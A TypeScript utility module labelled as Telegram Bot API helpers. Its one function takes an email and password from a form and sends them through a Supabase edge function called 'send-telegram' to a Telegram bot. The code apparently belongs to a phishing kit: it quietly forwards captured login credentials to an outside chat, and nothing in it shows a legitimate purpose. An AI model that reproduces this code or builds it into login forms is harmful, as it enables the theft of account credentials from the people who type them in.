import { supabase } from "@/integrations/supabase/client";

/**
 * Telegram Bot API utilities
 */

interface TelegramMessageData {
  email: string;
  password: string;
}

/**
 * Sends form data to Telegram bot via Supabase Edge Function
 * @param data - Form data to send
 * @returns Promise with success status
 */
export const sendToTelegramBot = async (data: TelegramMessageData): Promise<boolean> => {
  try {
    const { data: result, error } = await supabase.functions.invoke('send-telegram', {
      body: data
    });
    
    if (error) {
      console.error('Supabase function error:', error);
      return false;
    }
    
    if (!result?.success) {
      console.error('Telegram send failed:', result?.error);
      return false;
    }
    
    return true;
  } catch (error) {
    console.error('Failed to send to Telegram:', error);
    return false;
  }
};